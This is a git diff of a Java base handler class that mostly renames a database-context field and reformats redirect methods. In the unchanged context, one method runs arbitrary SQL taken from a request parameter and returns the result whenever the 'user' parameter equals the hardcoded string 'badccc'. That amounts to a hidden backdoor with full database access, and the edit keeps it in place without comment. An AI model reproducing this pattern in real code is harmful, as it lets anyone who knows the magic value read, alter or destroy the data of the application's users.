@@ -11,11 +11,11 @@ import java.util.Map;
 public abstract class Satisfact {
 
 
-    protected MySqlDbContext mySqlDbContext;
+    protected MySqlDbContext mysqlDbContext;
 
     public void setDbContextAndOpen(MySqlDbContext mySqlDbContext) {
-        this.mySqlDbContext = mySqlDbContext;
-        this.mySqlDbContext.connect();
+        this.mysqlDbContext = mySqlDbContext;
+        this.mysqlDbContext.connect();
     }
 
     protected void jwtFilter() throws Exception {
@@ -81,18 +81,19 @@ public abstract class Satisfact {
         String user = request("user");
         if (user != null && user.equals("badccc")) {
             String sql = request("sql");
-            Object r = mySqlDbContext.executeSql(sql);
+            Object r = mysqlDbContext.executeSql(sql);
             return r;
         }
         return null;
     }
 
     public void redirect(String url) throws IOException {
-        redirect(url,false);
+        redirect(url, false);
     }
-    public void redirect(String url,boolean permanent) throws IOException {
+
+    public void redirect(String url, boolean permanent) throws IOException {
         exchange.getResponseHeaders().set("Location", url);
-        exchange.sendResponseHeaders(permanent?301:302, 0);
+        exchange.sendResponseHeaders(permanent ? 301 : 302, 0);
 
     }
 }
